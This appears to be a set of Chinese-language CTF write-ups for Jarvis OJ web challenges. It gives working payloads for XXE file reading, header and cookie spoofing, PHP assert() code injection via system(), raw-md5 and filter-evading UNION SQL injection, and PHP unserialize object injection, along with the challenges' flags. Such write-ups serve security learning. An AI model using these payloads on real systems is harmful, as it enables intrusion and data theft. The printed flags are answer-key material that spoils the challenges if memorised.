## api调用
请设法获得目标机器/home/ctf/flag.txt中的flag值。
- 查看网页源代码 在`<script>`中看到XMLHttpRequest
- 通过post请求上传xml文件 这里可以利用XXE漏洞（XML外部实体注入）
- bp抓包 默认`Content-Type: application/json` 修改为`application/xml` 同时附加payload

```
<?xml version="1.0"?>
<!DOCTYPE GVI [<!ENTITY xxe SYSTEM "file:///home/ctf/flag.txt" >]>
<something>&xxe;</something>
```
- CTF{XxE_15_n0T_S7range_Enough}

## localhost
进入网页显示localhost access only!!
- X-Forwarded-For: 127.0.0.1
- PCTF{X_F0rw4rd_F0R_is_not_s3cuRe}

## PORT51
- 进入网页显示Please use port 51 to visit this site.
- url是`http://web.jarvisoj.com:32770/`却提示让我们通过51端口访问
- 是我理解错了 应该是本地端口51访问 用到`local-port`
- 构造exp`sudo curl --local-port 51 http://web.jarvisoj.com:32770/`
- ???

## admin
进入网页显示Hello World 
- 扫目录 index.php与robot.txt
- 前者无发现 后者发现`Disallow: /admin_s3cr3t.php`
- 进入admin_s3cr3t.php 显示ctf{hello guest}
- 肯定不是 postman分析 `cookie：admin=0`改成`admin=1`

## babyphp
进入网页是一个个人blog
- 在about处看到博主使用git 涉及git源码泄露
- 用gittools 下载源代码
```
./gitdumper.sh http://web.jarvisoj.com:32798/.git/ ../git
./extractor.sh ../git ../src
```
- 在src目录 目录结构
```
.
├── commit-meta.txt
├── index.php
└── templates
    ├── about.php
    ├── contact.php
    ├── flag.php
    └── home.php
```
- flag.php 中flag被抹去 查看index.php
```php
<?php
if (isset($_GET['page'])) {
	$page = $_GET['page'];
} else {
	$page = "home";
}
$file = "templates/" . $page . ".php";
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
assert("file_exists('$file')") or die("That file doesn't exist!");
?>
......
```
- 看到`file`利用$page组成路径，`assert`执行字符串代码，存在注入
- 构造payload

```
http://web.jarvisoj.com:32798/?page='.system("tac templates/flag.php").'
http://web.jarvisoj.com:32798/?page=flag'.system("cat templates/flag.php;").'//查看源代码
http://web.jarvisoj.com:32798/?page=' and die(show_source('templates/flag.php')) or '
```

- 61dctf{8e_careful_when_us1ng_ass4rt}

## login
是一道sql注入题 （需要钻研）
- postman分析header`hint："select * from `admin` where password='".md5($pass,true)."'"`
- 重点是md5($pass,true) 当参数二位true时返回16位原始二进制格式的字符串
- 假设`pass=ffifdyop` 先加密md5`276f722736c95d99e921722cf9ed621c`在转换成字符串`'or'6?]??!r,??b`
- sql语句就变成`select * from `admin` where password=''or'6?]??!r,??b`
- password=''自然可以过 后者`'or'6?]??!r,??b`因为or后`'6...'`是以6(数字)开头相当于`or 1`
- 也就是sql语句`select * from `admin` where password=''or 1` 自然可以查询 不过经查询 类似与`'1xxx'=1`这种判别方法在mysql有效 在其他数据库并不一定可以
- 输入`ffifdyop`
- PCTF{R4w_md5_is_d4ng3rous}

## inject
Hint1: 先找到源码再说吧~~
- 题目位注入 先让我们找到源码
- 用SourceLeakHacker扫一下 找出`index.php~`打开看到源码
```php
<?php
require("config.php");
$table = $_GET['table']?$_GET['table']:"test";
$table = Filter($table);
mysqli_query($mysqli,"desc `secret_{$table}`") or Hacker();
$sql = "select 'flag{xxx}' from secret_{$table}";
$ret = sql_query($sql);
echo $ret[0];
?>
```

## Web?
打开网址是一个表单 
- 输入几个数据check 提示`Wrong Password!!`
- 没有头绪查看源代码发现`app.js`
- 搜索字符串`Wrong Password!!`的函数
```js
function(t) {
    self.checkpass(e) ? self.setState({
        errmsg: "Success!!",
        errcolor: b.green400
    }) : (self.setState({
        errmsg: "Wrong Password!!"
        ......
    }))
})
```
- 可以看到是一个三目运算的条件判断 查找一下`checkpass`
```js
if (25 !== e.length) return !1;
  for (var t = [], n = 0; n < 25; n++) t.push(e.charCodeAt(n));
  for (var r = [325799, 309234, 317320, 327895, 298316, 301249, 330242, 289290, 273446, 337687, 258725, 267444, 373557, 322237, 344478, 362136, 331815, 315157, 299242, 305418, 313569, 269307, 338319, 306491, 351259], o = [
      [11, 13, 32, 234, 236, 3, 72, 237, 122, 230, 157, 53, 7, 225, 193, 76, 142, 166, 11, 196, 194, 187, 152, 132, 135],
      [76, 55, 38, 70, 98, 244, 201, 125, 182, 123, 47, 86, 67, 19, 145, 12, 138, 149, 83, 178, 255, 122, 238, 187, 221],
      [218, 233, 17, 56, 151, 28, 150, 196, 79, 11, 150, 128, 52, 228, 189, 107, 219, 87, 90, 221, 45, 201, 14, 106, 230],
      [30, 50, 76, 94, 172, 61, 229, 109, 216, 12, 181, 231, 174, 236, 159, 128, 245, 52, 43, 11, 207, 145, 241, 196, 80],
      [134, 145, 36, 255, 13, 239, 212, 135, 85, 194, 200, 50, 170, 78, 51, 10, 232, 132, 60, 122, 117, 74, 117, 250, 45],
      [142, 221, 121, 56, 56, 120, 113, 143, 77, 190, 195, 133, 236, 111, 144, 65, 172, 74, 160, 1, 143, 242, 96, 70, 107],
      [229, 79, 167, 88, 165, 38, 108, 27, 75, 240, 116, 178, 165, 206, 156, 193, 86, 57, 148, 187, 161, 55, 134, 24, 249],
      [235, 175, 235, 169, 73, 125, 114, 6, 142, 162, 228, 157, 160, 66, 28, 167, 63, 41, 182, 55, 189, 56, 102, 31, 158],
      [37, 190, 169, 116, 172, 66, 9, 229, 188, 63, 138, 111, 245, 133, 22, 87, 25, 26, 106, 82, 211, 252, 57, 66, 98],
      [199, 48, 58, 221, 162, 57, 111, 70, 227, 126, 43, 143, 225, 85, 224, 141, 232, 141, 5, 233, 69, 70, 204, 155, 141],
      [212, 83, 219, 55, 132, 5, 153, 11, 0, 89, 134, 201, 255, 101, 22, 98, 215, 139, 0, 78, 165, 0, 126, 48, 119],
      [194, 156, 10, 212, 237, 112, 17, 158, 225, 227, 152, 121, 56, 10, 238, 74, 76, 66, 80, 31, 73, 10, 180, 45, 94],
      [110, 231, 82, 180, 109, 209, 239, 163, 30, 160, 60, 190, 97, 256, 141, 199, 3, 30, 235, 73, 225, 244, 141, 123, 208],
      [220, 248, 136, 245, 123, 82, 120, 65, 68, 136, 151, 173, 104, 107, 172, 148, 54, 218, 42, 233, 57, 115, 5, 50, 196],
      [190, 34, 140, 52, 160, 34, 201, 48, 214, 33, 219, 183, 224, 237, 157, 245, 1, 134, 13, 99, 212, 230, 243, 236, 40],
      [144, 246, 73, 161, 134, 112, 146, 212, 121, 43, 41, 174, 146, 78, 235, 202, 200, 90, 254, 216, 113, 25, 114, 232, 123],
      [158, 85, 116, 97, 145, 21, 105, 2, 256, 69, 21, 152, 155, 88, 11, 232, 146, 238, 170, 123, 135, 150, 161, 249, 236],
      [251, 96, 103, 188, 188, 8, 33, 39, 237, 63, 230, 128, 166, 130, 141, 112, 254, 234, 113, 250, 1, 89, 0, 135, 119],
      [192, 206, 73, 92, 174, 130, 164, 95, 21, 153, 82, 254, 20, 133, 56, 7, 163, 48, 7, 206, 51, 204, 136, 180, 196],
      [106, 63, 252, 202, 153, 6, 193, 146, 88, 118, 78, 58, 214, 168, 68, 128, 68, 35, 245, 144, 102, 20, 194, 207, 66],
      [154, 98, 219, 2, 13, 65, 131, 185, 27, 162, 214, 63, 238, 248, 38, 129, 170, 180, 181, 96, 165, 78, 121, 55, 214],
      [193, 94, 107, 45, 83, 56, 2, 41, 58, 169, 120, 58, 105, 178, 58, 217, 18, 93, 212, 74, 18, 217, 219, 89, 212],
      [164, 228, 5, 133, 175, 164, 37, 176, 94, 232, 82, 0, 47, 212, 107, 111, 97, 153, 119, 85, 147, 256, 130, 248, 235],
      [221, 178, 50, 49, 39, 215, 200, 188, 105, 101, 172, 133, 28, 88, 83, 32, 45, 13, 215, 204, 141, 226, 118, 233, 156],
      [236, 142, 87, 152, 97, 134, 54, 239, 49, 220, 233, 216, 13, 143, 145, 112, 217, 194, 114, 221, 150, 51, 136, 31, 198]
    ], n = 0; n < 25; n++) {
    for (var i = 0, a = 0; a < 25; a++) i += t[a] * o[n][a];
    if (i !== r[n]) return !1
  }
  return !0
```
- 线性方程组 写出对应py
```py
import numpy as np
o = [[11, 13, 32, 234, 236, 3, 72, 237, 122, 230, 157, 53, 7, 225, 193, 76, 142, 166, 11, 196, 194, 187, 152, 132, 135], [76, 55, 38, 70, 98, 244, 201, 125, 182, 123, 47, 86, 67, 19, 145, 12, 138, 149, 83, 178, 255, 122, 238, 187, 221], [218, 233, 17, 56, 151, 28, 150, 196, 79, 11, 150, 128, 52, 228, 189, 107, 219, 87, 90, 221, 45, 201, 14, 106, 230], [30, 50, 76, 94, 172, 61, 229, 109, 216, 12, 181, 231, 174, 236, 159, 128, 245, 52, 43, 11, 207, 145, 241, 196, 80], [134, 145, 36, 255, 13, 239, 212, 135, 85, 194, 200, 50, 170, 78, 51, 10, 232, 132, 60, 122, 117, 74, 117, 250, 45], [142, 221, 121, 56, 56, 120, 113, 143, 77, 190, 195, 133, 236, 111, 144, 65, 172, 74, 160, 1, 143, 242, 96, 70, 107], [229, 79, 167, 88, 165, 38, 108, 27, 75, 240, 116, 178, 165, 206, 156, 193, 86, 57, 148, 187, 161, 55, 134, 24, 249], [235, 175, 235, 169, 73, 125, 114, 6, 142, 162, 228, 157, 160, 66, 28, 167, 63, 41, 182, 55, 189, 56, 102, 31, 158], [37, 190, 169, 116, 172, 66, 9, 229, 188, 63, 138, 111, 245, 133, 22, 87, 25, 26, 106, 82, 211, 252, 57, 66, 98], [199, 48, 58, 221, 162, 57, 111, 70, 227, 126, 43, 143, 225, 85, 224, 141, 232, 141, 5, 233, 69, 70, 204, 155, 141], [212, 83, 219, 55, 132, 5, 153, 11, 0, 89, 134, 201, 255, 101, 22, 98, 215, 139, 0, 78, 165, 0, 126, 48, 119], [194, 156, 10, 212, 237, 112, 17, 158, 225, 227, 152, 121, 56, 10, 238, 74, 76, 66, 80, 31, 73, 10, 180, 45, 94], [110, 231, 82, 180, 109, 209, 239, 163, 30, 160, 60, 190, 97, 256, 141, 199, 3, 30, 235, 73, 225, 244, 141, 123, 208], [220, 248, 136, 245, 123, 82, 120, 65, 68, 136, 151, 173, 104, 107, 172, 148, 54, 218, 42, 233, 57, 115, 5, 50, 196], [190, 34, 140, 52, 160, 34, 201, 48, 214, 33, 219, 183, 224, 237, 157, 245, 1, 134, 13, 99, 212, 230, 243, 236, 40], [144, 246, 73, 161, 134, 112, 146, 212, 121, 43, 41, 174, 146, 78, 235, 202, 200, 90, 254, 216, 113, 25, 114, 232, 123], [158, 85, 116, 97, 145, 21, 105, 2, 256, 69, 21, 152, 155, 88, 11, 232, 146, 238, 170, 123, 135, 150, 161, 249, 236], [251, 96, 103, 188, 188, 8, 33, 39, 237, 63, 230, 128, 166, 130, 141, 112, 254, 234, 113, 250, 1, 89, 0, 135, 119], [192, 206, 73, 92, 174, 130, 164, 95, 21, 153, 82, 254, 20, 133, 56, 7, 163, 48, 7, 206, 51, 204, 136, 180, 196], [106, 63, 252, 202, 153, 6, 193, 146, 88, 118, 78, 58, 214, 168, 68, 128, 68, 35, 245, 144, 102, 20, 194, 207, 66], [154, 98, 219, 2, 13, 65, 131, 185, 27, 162, 214, 63, 238, 248, 38, 129, 170, 180, 181, 96, 165, 78, 121, 55, 214], [193, 94, 107, 45, 83, 56, 2, 41, 58, 169, 120, 58, 105, 178, 58, 217, 18, 93, 212, 74, 18, 217, 219, 89, 212], [164, 228, 5, 133, 175, 164, 37, 176, 94, 232, 82, 0, 47, 212, 107, 111, 97, 153, 119, 85, 147, 256, 130, 248, 235], [221, 178, 50, 49, 39, 215, 200, 188, 105, 101, 172, 133, 28, 88, 83, 32, 45, 13, 215, 204, 141, 226, 118, 233, 156], [236, 142, 87, 152, 97, 134, 54, 239, 49, 220, 233, 216, 13, 143, 145, 112, 217, 194, 114, 221, 150, 51, 136, 31, 198]]
r = [325799, 309234, 317320, 327895, 298316, 301249, 330242, 289290, 273446, 337687, 258725, 267444, 373557, 322237, 344478, 362136, 331815, 315157, 299242, 305418, 313569, 269307, 338319, 306491, 351259]
o = np.array(o)
r = np.array(r)
x = np.linalg.solve(o,r)
flag = ''
for i in range(len(x)):
    flag += chr(int(round(x[i])))
print flag
```
- QWB{R3ac7_1s_interesting}

## 神盾局的秘密
打开网址一张图片
- 查看源码
``` html
<img src="showimg.php?img=c2hpZWxkLmpwZw==" width="100%"/>
```
- 含有base64`c2hpZWxkLmpwZw==`解码为`shield.jpg`
- 尝试读取index.php`showimg.php?img=aW5kZXgucGhw`
```php
<?php 
	require_once('shield.php');
	$x = new Shield();
	isset($_GET['class']) && $g = $_GET['class'];
	if (!empty($g)) {
		$x = unserialize($g);
	}
	echo $x->readfile();
?>
```
- index.php包含shield.php 尝试读取shield.php
```php
<?php
	//flag is in pctf.php
	class Shield {
		public $file;
		function __construct($filename = '') {
			$this -> file = $filename;
		}
		
		function readfile() {
			if (!empty($this->file) && stripos($this->file,'..')===FALSE  
			&& stripos($this->file,'/')===FALSE && stripos($this->file,'\\')==FALSE) {
				return @file_get_contents($this->file);
			}
		}
	}
?>
```
- 构造pctf.php反序列化 得`O:6:"Shield":1:{s:4:"file";s:8:"pctf.php";}`
```php
<?php
  class Shield {
    public $file = "pctf.php";
  }
  $chybeta = new Shield();
  print_r(serialize($chybeta));
  ?>
```
- 构造payload`?class=O:6:"Shield":1:{s:4:"file";s:8:"pctf.php";}`
- PCTF{W3lcome_To_Shi3ld_secret_Ar3a}

## IN A Mess
打开网址查看源代码
-  index.phps

```php
<?php
error_reporting(0);
echo "<!--index.phps-->";

if(!$_GET['id'])
{
  header('Location: index.php?id=1');
  exit();
}
$id=$_GET['id'];
$a=$_GET['a'];
$b=$_GET['b'];
if(stripos($a,'.'))
{
  echo 'Hahahahahaha';
  return ;
}
$data = @file_get_contents($a,'r');
if($data=="1112 is a nice lab!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
{
  require("flag.txt");
}
else
{
  print "work harder!harder!harder!";
}
?>
```

- 三个参数 id b a 
- 阅读源码输出flag.txt条件 
    - id需要等于0 但第一个if id不能为0 可用十六进制0x0绕过
    - a 用php://input绕过
    - b长度得大于5 第一个字符不能为4 同时`eregi("111".substr($b,0,1),"1114")`为真
        - 用%00阶段 b=%0012345
- payload

```
POST /index.php?id=0x0&a=php://input&b=%0012345 HTTP/1.1
......

1112 is a nice lab!
```

- reponse`<!--index.phps-->﻿Come ON!!! {/^HT2mCpcvOLf}`
- 访问http://web.jarvisoj.com:32780/^HT2mCpcvOLf
  显示hi666 同时地址栏自动补全`http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1`
- 猜测是sql注入 且服务器屏蔽了空格关键词
  用`/*123*/`注释代替空格 ununionion代替union selselectect代替select
- 查找列数`http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=0/*123*/ununionion/*123*/selselectect/*123*/1,2,3#` 返回3
- 查找数据库名`http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=0/*123*/ununionion/*123*/selselectect/*123*/1,2,database()#` 返回test
- 查找表名`http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(table_name)/*1*/frofromm/*1*/information_schema.tables/*1*/where/*1*/table_schema=0x74657374#` information_schema为数据库信息 0x74657374为test 返回content
- 查询content表的列`http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(column_name)/*1*/frofromm/*1*/information_schema.columns/*1*/where/*1*/table_name=0x636f6e74656e74` 返回id,context,title
- 输出id context title `http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=0/*123*/uniunionon/*123*/selselectect/*123*/1,2,group_concat(id,context,title)/*123*/frfromom/*111*/content#`
- 返回1PCTF{Fin4lly_U_got_i7_C0ngRatulation5}hi666
- PCTF{Fin4lly_U_got_i7_C0ngRatulation5}


